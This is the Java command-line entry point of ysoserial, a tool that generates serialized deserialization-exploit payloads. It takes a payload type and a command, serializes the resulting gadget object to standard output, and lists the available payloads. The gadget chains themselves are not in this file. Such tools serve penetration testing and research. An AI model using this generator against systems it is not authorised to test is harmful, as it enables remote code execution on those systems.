package ysoserial;

import java.io.PrintStream;
import java.util.*;

import org.apache.commons.cli.ParseException;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.ParameterizedObjectPayload;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;

@SuppressWarnings("rawtypes")
public class GeneratePayload {
	private static final int INTERNAL_ERROR_CODE = 70;
	private static final int USAGE_CODE = 64;

	public static void main(final String[] args) {
		if (args.length == 0) {
			printUsage();
			System.exit(USAGE_CODE);
		}
		final String payloadType = args[0];
		final String[] payloadArgs = Arrays.copyOfRange(args, 1, args.length);

		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
		if (payloadClass == null) {
			System.err.println("Invalid payload type '" + payloadType + "'");
			printUsage();
			System.exit(USAGE_CODE);
			return; // make null analysis happy
		}

		try {
			final ObjectPayload payload = payloadClass.newInstance();
			if(payloadArgs.length == 0) {
				if (payload instanceof ParameterizedObjectPayload) {
					System.err.println(((ParameterizedObjectPayload) payload).getHelp());
				} else {
					System.err.println("Usage: java -jar ysoserial-[version]-all.jar "+ payloadType +" '[command]'");
				}
				System.exit(USAGE_CODE);
				return;
			}
			final Object object;
			if (payload instanceof ParameterizedObjectPayload) {
				ParameterizedObjectPayload parameterizedPayload = (ParameterizedObjectPayload)payload;
				try {
					object = parameterizedPayload.getObject(payloadArgs);
				} catch (ParseException e) {
					System.err.println("Error: " + e.getMessage());
					System.err.println(parameterizedPayload.getHelp());
					System.exit(USAGE_CODE);
					return;
				} catch (IllegalArgumentException e) {
                    if (e.getMessage() != null) {
                        System.err.println("Error: " + e.getMessage());
                    }
					System.err.println(parameterizedPayload.getHelp());
					System.exit(USAGE_CODE);
					return;
				}
			} else {
				if (payloadArgs.length > 1) {
					System.err.println("Error: the payload '" + payloadType + "' does not support multiple arguments");
					printUsage();
					System.exit(USAGE_CODE);
					return;
				}
				object = payload.getObject(payloadArgs[0]);
			}
			PrintStream out = System.out;
			Serializer.serialize(object, out);
			ObjectPayload.Utils.releasePayload(payload, object);
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			System.exit(INTERNAL_ERROR_CODE);
		}
		System.exit(0);
	}

	private static void printUsage() {
		System.err.println("Y SO SERIAL?");
		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] [arguments ...]");
		System.err.println("  Available payload types:");

		final List<Class<? extends ObjectPayload>> payloadClasses =
			new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
		Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[] {"Payload", "Authors", "Dependencies"});
        rows.add(new String[] {"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
             rows.add(new String[] {
                payloadClass.getSimpleName(),
                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}
